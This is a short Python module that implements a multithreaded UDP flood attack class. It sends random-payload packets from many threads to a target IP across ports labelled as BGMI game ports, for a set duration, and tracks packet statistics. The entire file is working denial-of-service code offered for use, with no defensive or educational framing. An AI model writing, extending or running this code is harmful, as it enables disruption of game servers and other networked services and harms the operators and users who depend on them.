import socket
import threading
import time
import random
from .utils import Statistics

class UDPFlood:
    def __init__(self):
        self.stop_flag = False
        self.stats = Statistics()
    
    def start_attack(self, ip, port, threads=100, duration=30):
        self.stop_flag = False
        self.stats = Statistics()
        self.stats.start()
        
        # BGMI game ports range
        bgmi_ports = [7000, 8000, 9000, 10000, 11000, 12000, 13000, 14000, 15000]
        if port:
            bgmi_ports = [port] + [port + i for i in range(1, 20)]
        
        def flood():
            while not self.stop_flag:
                try:
                    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                    
                    # BGMI game packet simulation (500-1500 bytes)
                    packet_size = random.randint(500, 1500)
                    packet = random._urandom(packet_size)
                    
                    # Random target port from BGMI range
                    target_port = random.choice(bgmi_ports)
                    
                    s.sendto(packet, (ip, target_port))
                    self.stats.add_packet(packet_size)
                    s.close()
                except:
                    self.stats.add_error()
        
        thread_list = []
        for i in range(threads):
            t = threading.Thread(target=flood, daemon=True)
            t.start()
            thread_list.append(t)
        
        time.sleep(duration)
        self.stop_flag = True
        
        for t in thread_list:
            t.join(timeout=2)
        
        return self.stats.get_report()
    
    def stop_attack(self):
        self.stop_flag = True
        return True
